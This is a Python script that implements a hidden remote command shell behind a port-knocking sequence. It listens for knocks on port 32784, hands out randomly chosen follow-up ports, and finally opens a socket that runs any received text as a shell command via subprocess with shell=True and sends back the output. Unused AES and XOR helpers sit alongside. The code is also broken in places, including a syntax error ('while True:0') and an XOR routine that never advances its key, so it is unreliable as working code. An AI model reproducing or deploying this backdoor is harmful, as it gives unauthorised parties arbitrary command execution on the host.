import socket
import random
import sys
import subprocess
from base64 import b64encode, b64decode
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad

global cryptKey

def xor(data, key):
    ciphertext = []
    keypos = 0
    for i in range(len(data)):
        if i >= len(key) - 1:
            keypos = 0
        ciphertext.append(ord(data[i]) ^ ord(key[keypos]))
    return ciphertext

def encrypt(key, plaintext):
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return [b64encode(tag).decode('utf-8')[::-1], b64encode(nonce).decode('utf-8')[::-1], b64encode(ciphertext).decode('utf-8')[::-1]]


def decrypt(tag, nonce, key, ciphertext):
    print(tag, nonce, key, ciphertext)
    tag = b64decode(tag[::-1])
    nonce = b64decode(nonce[::-1])
    key = b64decode(key[::-1])
    ciphertext = b64decode(ciphertext[::-1])

    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    plaintext = cipher.decrypt(ciphertext)
    try:
        cipher.verify(tag)
        print("The message is authentic:", plaintext)
    except ValueError:
        print("Key incorrect or message corrupted")

def knockSocket(host, port, msg, key):

    server = socket.socket()
    server.bind((host, port))
    server.listen(1)

    conn, addr = server.accept()

    while True:
        data = conn.recv(1024)
        print("Connection: " + str(addr))
        if not data:
            break
        if key:
            cryptKey = bytes(data[0:-1])    ## Remove \n's
            print(cryptKey)
        if len(msg) > 0:
                msg += "\n"
                conn.send(msg.encode('ascii'))
        return True
    
def cmdSocket(host, port):

    server = socket.socket()
    server.bind((host, port))
    server.listen(1)

    conn, addr = server.accept()

    while True:0
        data = conn.recv(1024)
        print("Shell Connection: " + str(addr))
        if not data:
            break
        print("Command to run: " + data.decode('utf-8'))
        if len(data) > 0:
            command = data.decode('utf-8')
            output = subprocess.check_output(command, shell=True)
            conn.send(output)







if __name__ == '__main__':

    previousPorts = []
    port = 32784
    knocks = random.randrange(1, 6, 1)
    host = "127.0.0.1"
    running = True
    success = False
    print("Knocks: " + str(knocks))
    print("Port: " + str(port))
    for i in range(knocks):
        nextPort = random.randrange(1024, 65000)
        if(i == 0):
            knockSuccess = knockSocket(host, port, str(nextPort), True)
        else:
            knockSuccess = knockSocket(host, port, str(nextPort), False)
        if knockSuccess:
            previousPorts.append(port)
            port = nextPort
        if(i == knocks - 1):
            success = True
    if success:
        cmdSocket(host, port)
        

